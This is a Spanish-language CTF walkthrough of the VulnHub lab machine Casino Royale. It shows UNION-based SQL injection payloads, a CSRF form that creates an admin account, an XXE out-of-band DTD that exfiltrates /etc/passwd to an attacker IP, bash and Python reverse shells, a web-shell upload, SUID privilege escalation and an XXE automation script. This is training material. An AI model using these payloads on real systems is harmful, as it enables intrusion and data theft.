#vulnhub #ctf-machine #medium-machine #linux  [Vulnhub Link](https://www.vulnhub.com/entry/casino-royale-1,287/)

## Enumeración inicial

Primeramente, hacemos un escaneo ARP con `arp-scan` para identificar la IP de la máquina víctima:
![[Pasted image 20240819153551.png]]

Si lanzamos una traza ICMP podemos identificar (normalmente) que se trata de un sistema Linux por su TTL (64):
![[Pasted image 20240819153755.png]]

### Nmap
Si hacemos un escaneo inicial con `nmap` de puertos abiertos mediante el protocolo TCP obtenemos:
![[Pasted image 20240819154343.png]]

Realizamos un escaneo detectando la versión y servicio de los puertos abiertos con el siguiente comando:
![[Pasted image 20240819154828.png]]

Como podemos ver hay bastante información relevante. Realizamos ahora un reconocimiento con `whatweb` del servicio HTTP del puerto 80:
![[Pasted image 20240819155414.png]]

## Fuzzing
Al hacer un *fuzzing* de directorios con `wfuzz` obtenemos:
![[Pasted image 20240819160054.png]]

Como hemos encontrado un directorio phpmyadmin podemos intuir que está corriendo PHP por detras así que podemos hacer un escaneo de  archvos.php:
![[Pasted image 20240819160934.png]]

## SQL Injection
Encontramos un archivo `index.php` por lo que si accedemos a él encontramos:
![[Pasted image 20240819161943.png]]

Se trata de una tabla que muestra contenido de los resultados, si analizamos por detrás que sucede cuando le damos a "view", podemos ver que se manda una solicitud con 2 parámetros el cual uno de ellos es vulnerable a SQL Injection:
![[Pasted image 20240819162527.png]]
![[Pasted image 20240819162545.png]]

Por lo tanto, extraemos la base de datos mediante una SQL Injection Union Based.

Si enviamos la siguiente traza podemos deducir que hay 2 columnas en la base de datos, ya que el output se mantiene
```
tournamentid=171118175238' order by 2-- -
```

Por lo que concatenamos un *union select* de la siguiente manera para extraer los nombres de las bases de datos:
```
tournamentid=1711181752' union select group_concat(schema_name),2 from information_schema.schemata-- -
```
![[Pasted image 20240819163354.png]]

Por lo que existen 3 bases de datos relevantes: phpmyadmin, pokerleague y vip. Sí listamos las tablas de poker league tenemos:
```
1711181752' union select group_concat(table_name),2 from information_schema.tables where table_schema="pokerleague"-- -
```
![[Pasted image 20240819164753.png]]

Vamos a listar las columnas de la tabla "pokermax_admin":
```
1711181752' union select group_concat(column_name),2 from information_schema.columns where table_schema="pokerleague" and table_name="pokermax_admin"-- -
```
![[Pasted image 20240819165325.png]]

Podemos ver *username* y *password*, vamos a acceder a estas columnas:
```
1711181752' union select group_concat(username, 0x3a, password),2 from pokerleague.pokermax_admin-- -
```
![[Pasted image 20240819165900.png]]

Tenemos un usuario (admin) y contraseña en claro (raise12millon).

## Admin web enumeration
Si miramos el código fuente de `install/` podemos ver que existe otro directorio llamado "pokeradmin":
![[Pasted image 20240819160726.png]]

Si hacemos fuzzing de subdirectorios de `pokeradmin/` obtenemos un directorio `pokeradmin/backup/`
![[Pasted image 20240819164859.png]]

Si hacemos *fuzzing* de archivos PHP en el directorio de `pokeradmin/` podemos encontrar:
![[Pasted image 20240819170527.png]]

Si accedemos a `pokeradmin/index.php` vemos lo siguiente:
![[Pasted image 20240819170617.png]]

Así que si nos logueamos con las credenciales extraídas de la base de datos obtenemos acceso al *Admin Area*:
![[Pasted image 20240819170724.png]]

En el *Admin Area* podemos ver una sección de backups donde se puede ver código corrupto:
![[Pasted image 20240819182058.png]]

Si analizamos en detalle que hace, podemos extraer que los backups se guardan con el nombre de la fecha por ejemplo: `30-01-2020.zip`. Por lo que podemos crearnos una *wordlist* personalizada con Python y hacer *fuzzing* en busca de backups antiguos:
![[Pasted image 20240819182304.png]]

Encontramos este backup que si lo analizamos contiene un archivo .sql con un antiguo admin y su contraseña:
![[Pasted image 20240819182438.png]]

Aun así estas credenciales no parecen ser útiles.

Si enumeramos la página manage players podemos ver que el *player* valenka tiene Una descripción peculiar:
![[Pasted image 20240819183727.png]]

## CSRF
Nos dice que es *manager* de varios clientes de `/vip-client-portfolios/?uri=blog` por lo que si accedemos a la web vemos:
![[Pasted image 20240819185111.png]]

Si buscamos con *searchsploit* sobre este CMS obtenemos:
![[Pasted image 20240819184327.png]]

Que se trata de un código html que permite crear un usuario administrador si un administrador accede y da al botón de *submit form*.
```html
<html>
  <body>
    <form action="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create" method="POST">
      <input type="hidden" name="emailAddress" value="adm1n@adm1n.com" />
      <input type="hidden" name="verifiedEmail" value="verified" />
      <input type="hidden" name="username" value="adm1n123" />
      <input type="hidden" name="newPassword" value="adm1n123" />
      <input type="hidden" name="confirmPassword" value="adm1n123" />
      <input type="hidden" name="userGroups[]" value="34" />
      <input type="hidden" name="userGroups[]" value="33" />
      <input type="hidden" name="memo" value="CSRFmemo" />
      <input type="hidden" name="status" value="1" />
      <input type="hidden" name="formAction" value="submit" />
      <input type="submit" value="Submit form" />
    </form>
  </body>
</html>
```


Si enumeramos la web encontramos esta sección:
![[Pasted image 20240819191459.png]]

Como podemos ver podemos enviar un correo mediante el puerto SMTP 25 abierto en la máquina a valenka. Donde supuestamente mirará los links si le especificamos a algún cliente en el subject. Por lo tanto, probamos de enviar un correo con un link al exploit para ver si valenka entra en él y crea un usuario administrador.
![[Pasted image 20240819192854.png]]
![[Pasted image 20240819193058.png]]

## XXE
Como podemos ver lo ha creado y ahora podemos acceder a una cuenta administradora con acceso a más páginas:
![[Pasted image 20240819194100.png]]

Si enumeramos las páginas encontramos un usuario con una *memo* peculiar:
![[Pasted image 20240819194155.png]]

Por lo que accedemos a la nueva página `/ultra-access-view/main.php`:
![[Pasted image 20240819194247.png]]

Si accedemos a su código fuente podemos ver estos comentarios:
![[Pasted image 20240819194338.png]]

Por lo que podemos probar de hacer una solicitud POST con una estructura XML:
```xml
<creds>
	<customer>test</customer>
	<password>test</password>
</creds>
```

Para ver si aparece "Welcome test!" en la web y se interpreta nuestro XML. Y como podemos ver se interpreta:
![[Pasted image 20240819223125.png]]

Por lo que podemos intentar apuntar a un DTD malicioso de mi máquina haciendo una solicitud con este código XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.21/malicious.dtd"> %xxe; ]>

<creds>
	<customer>
		test
	</customer>
</creds>
```

Nuestro DTD contendrá lo siguiente:
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.21/?file=%file;'>">
%eval;
%exfil;
```

Por lo que recibiremos el archivo indicado en base 64:
![[Pasted image 20240819223603.png]]

> [!NOTE] Para ver los archivos de la máquina he creado un pequeño script en bash: [[#Script XXE]]

## Fuzzing FTP
En su `/etc/passwd` podemos ver el usuario del que se hablava en el comentario anterior:
![[Pasted image 20240819223920.png]]

Por lo que podemos probar a hacer fuerza bruta por FTP con el usuario "ftpUserULTRA".

Después de hacer fuerza bruta por horas 💀 obtenemos la siguiente contraseña "bankbank":
![[Pasted image 20240820005946.png]]

## RCE
Por lo que accedemos por FTP a la máquina y probamos de subir un archivo cmd.php que permita la ejecución de comandos, pero no podemos:
![[Pasted image 20240819232749.png]]

Si lo subimos sin extensión si nos deja:
![[Pasted image 20240819232826.png]]

Por lo que podemos probar de cambiar el nombre con *rename*:
![[Pasted image 20240819232908.png]]

Pero no nos deja por lo que probamos con otras extensiones php:
![[Pasted image 20240819232946.png]]

Si vemos los permisos no se permite la ejecución:
![[Pasted image 20240819233034.png]]

Por lo que damos permisos de ejecución con *chmod*:
![[Pasted image 20240819233125.png]]

Por lo que si accedemos al archivo podemos ver como el código PHP se interpreta y tenemos RCE:
![[Pasted image 20240819233306.png]]

Así que entablamos una *reverse* *shell* con el comando:
```bash
bash -c "bash -i >& /dev/tcp/192.168.1.21/443 0>&1"
```
![[Pasted image 20240819233446.png]]

Y hacemos el tratamiento de la tty:
![[Pasted image 20240819233710.png]]
![[Pasted image 20240819233817.png]]


## Escalada de privilegios
### Escalada al usuario "le"
Si buscamos por archivos SUID podemos encontramos:
![[Pasted image 20240819234008.png]]

Si ejecutamos el binario podemos ver que el usuario le está ejecutando el archivo php-we-start.sh:
![[Pasted image 20240819235131.png]]

Podemos ver que se trate de lo siguiente:
![[Pasted image 20240819235628.png]]

Por lo tanto, hay un servidor HTTP por el puerto 8081 ejecutado por "le" con los archivos de /opt/casino-royale por lo que listamos su contenido:
![[Pasted image 20240820000000.png]]

Si miramos que contiene el archivo collect.php podemos ver que ejecuta el archivo de python el cual tenemos capacidad de escritura:
![[Pasted image 20240820000033.png]]

Así que añadimos el siguiente código:
```python
#!/usr/bin/python
import os

os.system("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.21/444 0>&1'")
```

Por lo que si hacemos un curl y nos ponemos en escucha con nc obtenemos acceso a la máquina como le:
![[Pasted image 20240820000537.png]]
![[Pasted image 20240820000551.png]]

> [!NOTE] Se hace el tratamiento de la tty como antes.

Y visualizamos la flag:
![[Pasted image 20240820001324.png]]
### Escalada a root
Si nos fijamos en el archivo SUID de antes, y listamos los caracteres leíbles podemos ver como este binario ejecuta el run.sh:
![[Pasted image 20240820003858.png]]

Pero el run.sh el propietario es "le" por lo que podemos modificarlo y escalar privilegios a root poniendo este contenido y ejecutando el binario suid:
```bash
#!/bin/bash

/bin/bash -p
```
![[Pasted image 20240820004015.png]]

Finalmente si accedemos a `/root/flag` y ejecutamos `./flag.sh` podemos visualizar la flag en el puerto 8082:
![[Pasted image 20240820004221.png]]


## Script XXE
```bash
#!/bin/bash

file_name="$1"

dtd="""<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=${file_name}\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.1.21/?file=%file;'>\">
%eval;
%exfil;"""

echo "$dtd" > malicious.dtd


PYTHONUNBUFFERED=x python3 -m http.server 80 &> server.log & disown
sleep 2
pid="$!"

curl -s -X POST "http://casino-royale.local/ultra-access-view/main.php" --data '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.1.21/malicious.dtd"> %xxe; ]>
<creds><customer>testting</customer></creds>' &>/dev/null

sleep 2
echo ""
cat server.log | grep "file" | awk '{print $7}' | sed 's/\/?file=//' | base64 -d

kill -9 "$pid"
```

____
#sqli #file-upload-attacks #abusing-suid #xxe  #web-enumeration #csrf #information-leakage #ftp-brute-forcing 
___
